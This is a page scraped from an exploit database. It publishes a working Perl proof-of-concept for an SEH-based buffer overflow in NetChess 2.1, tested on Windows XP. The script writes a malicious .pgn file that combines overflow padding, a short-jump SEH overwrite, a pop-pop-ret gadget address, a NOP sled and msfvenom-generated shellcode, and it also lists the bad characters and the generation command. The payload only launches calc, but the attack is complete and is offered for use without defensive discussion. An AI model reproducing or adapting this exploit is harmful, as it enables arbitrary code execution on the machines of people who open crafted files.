---
title: NetChess 2.1 Buffer Overflow
url: https://cxsecurity.com/issue/WLB-2023010032
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-21
fetch_date: 2025-10-04T04:27:49.817874
---

# NetChess 2.1 Buffer Overflow

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **NetChess 2.1 Buffer Overflow** **2023-01-20 / 2023-01-21**  Credit:  **[Ugur Eminli](https://cxsecurity.com/author/Ugur%2BEminli/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-119](https://cxsecurity.com/cwe/CWE-119 "Click to see CWE-119")** | |

# Exploit Title: NetChess2.1 Buffer Overflow (SEH)
# Date: 8/1/2022
# Exploit Author: Ugur Eminli
# Vendor Homepage: https://sourceforge.net/projects/avmnetchess/
# Software Link: https://sourceforge.net/projects/avmnetchess/
# Version: 2.1
# Tested on: WinXP SP2 Build 2600
#!/usr/bin/perl
my $file= "exploit.pgn";
my $junk= "\x41" x 336;
#JMP short 6bytes
my $seh="\xeb\x06\xcc\xcc";
#0x74d31567 : pop edi # pop esi # ret | {PAGE\_EXECUTE\_READ} [oledlg.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v1.0 (C:\WINDOWS\system32\oledlg.dll)
my $nseh= "\x67\x15\xd3\x74";
my $nop= "\x90" x 10;
#bad chars: \x00\x0a\x1a\x2f\x3b\x3c\x3f\x25\x28\x21\x22\x23\x24\x5e\x7b\x2e\x5b\x5d
# msfvenom -p windows/exec cmd=calc -e x86/alpha\_upper -a x86 --platform windows -f pl -b "\x00\x0a\x1a\x2f\x3b\x3c\x3f\x25\x28\x21\x22\x23\x24\x5e\x7b\x2e\x5b\x5d" EXITFUNC=seh
my $buf =
"\x89\xe7\xd9\xcc\xd9\x77\xf4\x5f\x57\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4d" .
"\x38\x4c\x42\x53\x30\x43\x30\x45\x50\x33\x50\x4c\x49\x4d" .
"\x35\x36\x51\x4f\x30\x35\x34\x4c\x4b\x56\x30\x30\x30\x4c" .
"\x4b\x56\x32\x44\x4c\x4c\x4b\x51\x42\x45\x44\x4c\x4b\x34" .
"\x32\x47\x58\x54\x4f\x4e\x57\x31\x5a\x57\x56\x36\x51\x4b" .
"\x4f\x4e\x4c\x47\x4c\x45\x31\x43\x4c\x44\x42\x56\x4c\x57" .
"\x50\x49\x51\x38\x4f\x44\x4d\x55\x51\x39\x57\x5a\x42\x5a" .
"\x52\x30\x52\x46\x37\x4c\x4b\x51\x42\x52\x30\x4c\x4b\x30" .
"\x4a\x57\x4c\x4c\x4b\x50\x4c\x34\x51\x53\x48\x4b\x53\x30" .
"\x48\x53\x31\x38\x51\x50\x51\x4c\x4b\x46\x39\x37\x50\x43" .
"\x31\x48\x53\x4c\x4b\x50\x49\x44\x58\x5a\x43\x47\x4a\x31" .
"\x59\x4c\x4b\x46\x54\x4c\x4b\x33\x31\x49\x46\x46\x51\x4b" .
"\x4f\x4e\x4c\x49\x51\x38\x4f\x44\x4d\x55\x51\x39\x57\x30" .
"\x38\x4b\x50\x44\x35\x4c\x36\x55\x53\x53\x4d\x4a\x58\x47" .
"\x4b\x53\x4d\x57\x54\x43\x45\x4a\x44\x50\x58\x4c\x4b\x46" .
"\x38\x31\x34\x45\x51\x59\x43\x43\x56\x4c\x4b\x44\x4c\x50" .
"\x4b\x4c\x4b\x46\x38\x45\x4c\x33\x31\x39\x43\x4c\x4b\x45" .
"\x54\x4c\x4b\x45\x51\x58\x50\x4d\x59\x37\x34\x31\x34\x51" .
"\x34\x51\x4b\x31\x4b\x45\x31\x31\x49\x30\x5a\x50\x51\x4b" .
"\x4f\x4b\x50\x51\x4f\x51\x4f\x51\x4a\x4c\x4b\x34\x52\x4a" .
"\x4b\x4c\x4d\x31\x4d\x53\x5a\x45\x51\x4c\x4d\x4c\x45\x4e" .
"\x52\x55\x50\x45\x50\x33\x30\x56\x30\x45\x38\x36\x51\x4c" .
"\x4b\x32\x4f\x4d\x57\x4b\x4f\x58\x55\x4f\x4b\x4b\x4e\x44" .
"\x4e\x37\x42\x4b\x5a\x42\x48\x59\x36\x4a\x35\x4f\x4d\x4d" .
"\x4d\x4b\x4f\x49\x45\x47\x4c\x53\x36\x33\x4c\x44\x4a\x4d" .
"\x50\x4b\x4b\x4b\x50\x32\x55\x43\x35\x4f\x4b\x47\x37\x54" .
"\x53\x54\x32\x52\x4f\x32\x4a\x33\x30\x51\x43\x4b\x4f\x58" .
"\x55\x33\x53\x43\x51\x42\x4c\x55\x33\x45\x50\x41\x41";
open($FILE,">$file");
print $FILE "$junk$seh$nseh$nop$buf$nop";
close($FILE);
print "\r\n[+] Exploit File Created: $file \n";

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010032)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top